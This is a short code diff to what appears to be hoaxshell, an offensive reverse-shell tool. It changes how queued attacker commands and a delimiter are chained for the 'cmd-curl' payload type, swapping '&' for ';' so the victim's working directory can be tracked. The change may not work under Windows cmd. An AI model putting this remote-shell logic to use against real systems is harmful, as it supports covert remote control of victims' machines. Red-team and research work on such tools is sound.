@@ -102,7 +102,7 @@ else:
 	payload_type = args.type.lower().strip()
 	constraint_mode = True if payload_type in ['cmd-curl', 'ps-iex-cm', 'ps-outfile-cm'] else False
 	delimiter = str(uuid.uuid4())[0:8]
-	grab_prompt_dir_cmd = f"(echo {delimiter} & cd)" if payload_type in ['cmd-curl'] else "echo `r;pwd"
+	grab_prompt_dir_cmd = f"echo {delimiter} ; cd" if payload_type in ['cmd-curl'] else "echo `r;pwd"
 
 # Check if port is valid.
 if args.port:
@@ -573,7 +573,7 @@ def main():
 						if user_input == "pwd" and payload_type not in ['cmd-curl']:
 							user_input = "split-path $pwd'\\0x00'"
 						
-						full_command = f"({user_input} & echo {delimiter} & cd)" if payload_type in ['cmd-curl'] else user_input + ";pwd"
+						full_command = f"{user_input} ; echo {delimiter} ; cd" if payload_type in ['cmd-curl'] else user_input + ";pwd"
 						Hoaxshell.command_pool.append(full_command)
 						Hoaxshell.prompt_ready = False
 
